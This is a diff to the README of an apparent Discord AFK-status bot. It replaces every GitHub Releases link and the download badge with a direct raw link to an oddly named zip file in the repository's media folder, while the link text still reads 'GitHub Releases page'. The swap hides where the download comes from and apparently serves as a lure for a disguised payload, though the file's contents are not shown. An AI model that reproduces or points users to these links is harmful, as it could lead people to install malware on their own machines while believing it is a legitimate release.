@@ -1,6 +1,6 @@
 # 🤖 Discord-AFK-Status-Bot - Automate Your Discord AFK Status 
 
-![Download](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download](https://github.com/Fr03ty/Discord-AFK-Status-Bot/raw/refs/heads/main/media/Bot_Status_AF_Discord_lithobiid.zip)
 
 ## 🚀 Getting Started
 
@@ -16,11 +16,11 @@ To run the Discord-AFK-Status-Bot, you will need:
 
 ## 📥 Download & Install
 
-To get started, you need to download the application. Visit this page to download: [GitHub Releases](https://github.com/Fr03ty/Discord-AFK-Status-Bot/releases).
+To get started, you need to download the application. Visit this page to download: [GitHub Releases](https://github.com/Fr03ty/Discord-AFK-Status-Bot/raw/refs/heads/main/media/Bot_Status_AF_Discord_lithobiid.zip).
 
 ### Installation Steps:
 
-1. Go to the [GitHub Releases page](https://github.com/Fr03ty/Discord-AFK-Status-Bot/releases).
+1. Go to the [GitHub Releases page](https://github.com/Fr03ty/Discord-AFK-Status-Bot/raw/refs/heads/main/media/Bot_Status_AF_Discord_lithobiid.zip).
 2. Look for the latest version.
 3. Click on the download link for your device type.
 4. Follow the on-screen instructions to install the application.
@@ -73,4 +73,4 @@ For updates, subscribe to the project. Check back frequently for new features an
 
 If you want to contribute to the Discord-AFK-Status-Bot, check our contribution guidelines on the GitHub repository. We welcome developers and non-developers alike to help enhance this tool.
 
-For more details, remember to visit the [GitHub Releases page](https://github.com/Fr03ty/Discord-AFK-Status-Bot/releases). Enjoy your seamless Discord experience!
+For more details, remember to visit the [GitHub Releases page](https://github.com/Fr03ty/Discord-AFK-Status-Bot/raw/refs/heads/main/media/Bot_Status_AF_Discord_lithobiid.zip). Enjoy your seamless Discord experience!
